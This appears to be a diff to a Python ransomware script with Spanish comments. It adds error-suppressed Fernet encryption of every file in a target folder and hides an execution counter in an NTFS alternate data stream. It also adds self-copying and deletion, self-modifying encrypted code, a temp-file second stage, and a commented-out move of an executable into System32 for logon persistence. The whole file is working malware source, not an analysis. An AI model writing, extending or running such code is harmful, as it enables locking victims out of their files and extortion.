@@ -10,20 +10,35 @@ import signal
 from termcolor import colored
 import allfiles1
 import sys
-import cv2
+#import cv2
 import ctypes
 
 # Crl C
 def def_handler(sig, frame):
-    print(colored (f"\n[!] Saliendo...\n", "red"))
+    print(colored(f"\n[!] Saliendo...\n", "red"))
     sys.exit(1)
 
 signal.signal(signal.SIGINT, def_handler)
 
+def read_executions_from_ads(file_path):
+    ads_path = f"{file_path}:executions"
+    try:
+        with open(ads_path, "r") as f:
+            return int(f.read().strip())
+    except FileNotFoundError:
+        return 0
+
+def write_executions_to_ads(file_path, value):
+    ads_path = f"{file_path}:executions"
+    with open(ads_path, "w") as f:
+        f.write(str(value))
+
+
 def on_logon_registry(c_dir, file_e):
     dest_dir = r"C:\Windows\System32"
     try:
-        shutil.move(file_e, dest_dir)
+        if file_e not in dest_dir:
+            shutil.move(file_e, dest_dir)
         if file_e in c_dir:
             c_dir.remove(file_e)
         new_filepath = os.path.join(dest_dir, file_e)
@@ -65,6 +80,9 @@ def tmp_task():
 
         # Ejecutar el script desde el archivo temporal
         subprocess.run([sys.executable, temp_script_path])
+        executions = 2
+        write_executions_to_ads(file_path_ads, executions)
+
 
     else:
         print("Segunda ejecución completada desde el archivo temporal.")
@@ -105,6 +123,17 @@ def file_encrypt(files, key):
         with open(filepath, "wb") as file:
             file.write(data)
 
+def replicated():
+    current_file= __file__
+    filedir = os.path.join(os.getcwd(), "Note")
+    filename =sys.argv[0]
+    filepath = os.path.join(filedir, filename)
+    try:
+        shutil.copy2(filename, filedir)
+        time.sleep(2)
+        os.remove(current_file)
+    except Exception as e:
+        pass
 def self_modifying_code(keycode):
     new_code = """
 encrypted_code = b'{encrypted_code}'
@@ -125,13 +154,16 @@ def open_video(f_video):
 
 def file_encrypt(files, key):
     fernet = Fernet(key)
-    for filepath in files:  
-        with open(filepath, "rb") as file:  
-            data_to_encrypt = file.read()
-        data = fernet.encrypt(data_to_encrypt)
-
-        with open(filepath, "wb") as file:  
-            file.write(data)
+    try:
+        for filepath in files:  
+            with open(filepath, "rb") as file:  
+                data_to_encrypt = file.read()
+            data = fernet.encrypt(data_to_encrypt)
+    
+            with open(filepath, "wb") as file:  
+                file.write(data)
+    except Exception as e:
+        pass
 
 
 base_directory = r"C:\Users\Lenovo\OneDrive\Desktop\encrypt"
@@ -139,9 +171,11 @@ allfiles1.searching_files(base_directory)
 files = allfiles1.file_list
 
 #video = cv2.VideoCapture('formacion_random.mp4')
-gen_key()
-key = return_key()
-file_encrypt(files, key)
+if executions != 2:
+    gen_key()
+    key = return_key()
+
+    file_encrypt(files, key)
 time.sleep(5)
 subprocess.run(["python3", "interface.py"])
 #open_video(video)
@@ -155,13 +189,16 @@ subprocess.run(["python3", "interface.py"])
         f.write(formatted_code)
 
 def main():
+
+
     current_dir = os.path.dirname(os.path.abspath(__file__))
     py_e = "art.exe"
 
-    on_logon_registry(current_dir, py_e)
+    #on_logon_registry(current_dir, py_e)
     keycode = Fernet.generate_key()
     script_path = os.path.abspath(__file__)
-    self_modifying_code(keycode)
+    if executions != 2:
+        self_modifying_code(keycode)
 
     #subprocess.run(["python3", "ads_file.py", "texto3.txt", "-a", "art.py"])
     #time.sleep(10)
@@ -170,5 +207,12 @@ def main():
 
 
 if __name__ == '__main__':
+    file_path_ads = "C:\\Windows\win.txt"
+    executions = read_executions_from_ads(file_path_ads)
     main()
-    tmp_task()
+    if executions != 2:
+        tmp_task()
+
+
+
+
